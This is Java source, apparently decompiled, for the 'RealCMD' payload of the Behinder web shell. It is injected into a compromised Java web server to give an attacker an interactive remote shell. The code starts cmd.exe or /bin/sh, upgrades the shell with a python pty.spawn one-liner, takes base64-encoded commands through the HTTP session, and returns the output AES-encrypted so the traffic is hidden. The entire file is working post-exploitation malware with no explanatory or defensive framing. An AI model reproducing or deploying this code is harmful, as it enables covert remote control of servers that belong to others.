package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class RealCMD implements Runnable {
   public static String bashPath;
   public static String type;
   public static String cmd;
   public static String whatever;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var13 = false;

      Object so;
      Method write;
      label101: {
         try {
            var13 = true;
            this.fillContext(obj);
            result.put("msg", this.runCmd());
            result.put("status", "success");
            var13 = false;
            break label101;
         } catch (Exception var17) {
            result.put("status", "fail");
            result.put("msg", var17.getMessage());
            var13 = false;
         } finally {
            if (var13) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  if (result.get("msg") == null) {
                     result.put("msg", "");
                  }

                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var14) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            if (result.get("msg") == null) {
               result.put("msg", "");
            }

            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var15) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         if (result.get("msg") == null) {
            result.put("msg", "");
         }

         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var16) {
      }

      return true;
   }

   public RealCMD(Object session) {
      this.Session = session;
   }

   public RealCMD() {
   }

   public String runCmd() throws Exception {
      String result = "";
      if (type.equals("create")) {
         this.sessionSetAttribute(this.Session, "working", true);
         (new Thread(new RealCMD(this.Session))).start();
      } else if (type.equals("read")) {
         StringBuilder output = (StringBuilder)this.sessionGetAttribute(this.Session, "output");
         result = output.toString();
         output.setLength(0);
      } else if (type.equals("write")) {
         String input = new String(this.base64decode(cmd));
         BufferedWriter writer = (BufferedWriter)this.sessionGetAttribute(this.Session, "writer");
         writer.write(input);
         writer.flush();
      } else if (type.equals("stop")) {
         Process process = (Process)this.sessionGetAttribute(this.Session, "process");
         process.destroy();
      }

      return result;
   }

   public void run() {
      Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
      StringBuilder output = new StringBuilder();

      try {
         String os = System.getProperty("os.name").toLowerCase();
         ProcessBuilder builder;
         if (os.indexOf("windows") >= 0) {
            if (bashPath == null) {
               bashPath = "c:/windows/system32/cmd.exe";
            }

            builder = new ProcessBuilder(new String[]{bashPath});
         } else {
            if (bashPath == null) {
               bashPath = "/bin/sh";
            }

            builder = new ProcessBuilder(new String[]{bashPath});
            Map envs = builder.environment();
            envs.put("TERM", "xterm");
         }

         builder.redirectErrorStream(true);
         Process process = builder.start();
         OutputStream stdin = process.getOutputStream();
         InputStream stdout = process.getInputStream();
         BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
         this.sessionSetAttribute(this.Session, "reader", reader);
         this.sessionSetAttribute(this.Session, "writer", writer);
         this.sessionSetAttribute(this.Session, "output", output);
         this.sessionSetAttribute(this.Session, "process", process);
         if (os.indexOf("windows") < 0) {
            String spawn = String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath);
            writer.write(spawn + "\n");
            writer.flush();
         }

         byte[] buffer = new byte[1024];
         boolean var11 = false;

         int length;
         while((length = stdout.read(buffer)) > -1) {
            output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
         }
      } catch (IOException var12) {
         output.append(var12.getMessage());
      }

   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }
}
